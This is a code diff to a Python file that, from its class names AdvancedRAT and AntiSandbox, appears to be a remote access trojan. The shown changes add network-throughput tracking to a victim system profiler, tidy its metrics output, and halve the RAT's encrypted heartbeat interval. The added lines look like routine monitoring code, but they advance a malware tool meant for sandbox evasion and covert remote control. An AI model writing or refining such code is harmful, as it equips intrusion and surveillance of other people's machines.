@@ -906,7 +906,16 @@ class AntiSandbox:
 
 class SystemProfiler:
     """Advanced system profiling and information gathering (Cross-platform)"""
-    
+
+    def __init__(self):
+        """Initialize the profiler and set up network baseline counters"""
+        self._prev_net = None
+        self._prev_time = time.time()
+        # Initialize counter to have baseline for deltas
+        try:
+            self._prev_net = psutil.net_io_counters()
+        except:
+            self._prev_net = None
     @staticmethod
     def get_system_info():
         """Get comprehensive system information"""
@@ -980,20 +989,49 @@ class SystemProfiler:
         
         return info
     
-    @staticmethod
-    def get_metrics():
-        """Get live system metrics for real-time monitoring"""
+    def get_metrics(self):
+        """Get live system metrics for real-time monitoring with delta calculations"""
         try:
+            curr_time = time.time()
+            dt = curr_time - self._prev_time
+            if dt < 0.1: dt = 0.1 # Minimum step and prevent division by zero
+            
+            # Basic counters
+            cpu = psutil.cpu_percent()
+            mem = psutil.virtual_memory()
+            disk = psutil.disk_usage('/')
+            
+            # Network Calculation
+            try:
+                curr_net = psutil.net_io_counters()
+                if self._prev_net:
+                    bytes_recv = curr_net.bytes_recv - self._prev_net.bytes_recv
+                    bytes_sent = curr_net.bytes_sent - self._prev_net.bytes_sent
+                    # Expressed in KB/s
+                    net_in = (bytes_recv / 1024) / dt
+                    net_out = (bytes_sent / 1024) / dt
+                else:
+                    net_in = 0
+                    net_out = 0
+                self._prev_net = curr_net
+            except:
+                net_in = 0
+                net_out = 0
+            
+            self._prev_time = curr_time
+            
             return {
-                "cpu_usage": psutil.cpu_percent(),
-                "memory_usage": psutil.virtual_memory().percent,
-                "memory_total": psutil.virtual_memory().total,
-                "disk_usage": psutil.disk_usage('/').percent,
-                "disk_total": psutil.disk_usage('/').total,
+                "cpu_usage": round(cpu, 1),
+                "memory_usage": round(mem.percent, 1),
+                "memory_total": mem.total,
+                "disk_usage": round(disk.percent, 1),
+                "disk_total": disk.total,
+                "network_in": round(net_in, 2),
+                "network_out": round(net_out, 2),
                 "network_connections": len(psutil.net_connections() if hasattr(psutil, 'net_connections') else []),
-                "uptime": time.time() - psutil.boot_time()
+                "uptime": int(curr_time - psutil.boot_time())
             }
-        except:
+        except Exception:
             return {}
     
     @staticmethod
@@ -2037,7 +2075,7 @@ class AdvancedRAT:
                 except:
                     try: self._send_encrypted({'type': 'heartbeat'})
                     except: pass
-            time.sleep(10)
+            time.sleep(5)
     def _connection_loop(self):
         """Main connection loop with failover and mandatory backoff"""
         while self.running:
